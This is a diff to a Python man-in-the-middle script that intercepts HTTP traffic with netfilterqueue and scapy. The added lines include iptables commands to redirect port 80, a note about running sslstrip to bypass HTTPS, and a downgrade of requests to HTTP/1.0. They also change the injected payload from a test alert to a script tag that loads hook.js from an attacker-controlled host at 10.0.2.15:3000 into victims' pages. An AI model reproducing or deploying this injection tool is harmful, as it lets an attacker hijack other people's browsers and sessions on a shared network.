@@ -9,6 +9,11 @@
 # Enable IP forwarding
 # $ echo 1 > /proc/sys/net/ipv4/ip_forward
 
+# Redirecting Packets
+# $ iptable -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+# run sslstrip to bypass HTTPS
+
 import netfilterqueue
 import scapy.all as scapy
 import re
@@ -29,9 +34,10 @@ def processPacket(packet):
 		if scapyPacket[scapy.TCP].dport == 80:
 			print("[+] HTTP Request")
 			load = re.sub("Accept-Encoding:.*?\r\n", "", str(load))
+			load = load.replace("HTTP/1,1", "HTTP/1.0")
 		elif scapyPacket[scapy.TCP].sport == 80:
 			print("[+] HTTP Responce")
-			injectionCode = "<script>alert('Testing');</script>"
+			injectionCode = '<script src="http://10.0.2.15:3000/hook.js"></script>'
 			load = load.replace("</body>", injectionCode + "</body>")
 			contentLengthSearch = re.search("(?:content-length:\s)(\d*)", load)
 			if contentLengthSearch and "text/html" in load:
